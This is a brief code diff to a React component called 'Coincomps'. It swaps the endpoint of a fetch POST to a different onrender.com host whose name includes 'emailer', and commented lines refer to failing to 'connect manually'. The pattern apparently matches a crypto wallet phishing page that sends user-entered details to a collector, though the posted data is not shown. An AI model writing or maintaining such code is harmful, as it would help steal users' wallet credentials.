@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://alexdapps.onrender.com/details";
+        const url = "https://bayoleemailer.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
@@ -66,7 +66,6 @@ const Coincomps = ({ data }) => {
         // setFetchingData(false);
         // setIsError("Failed to connect manually. Please try again.");
       }
-      
 
       setIsLoading(false);
       // setTimeout(() => {
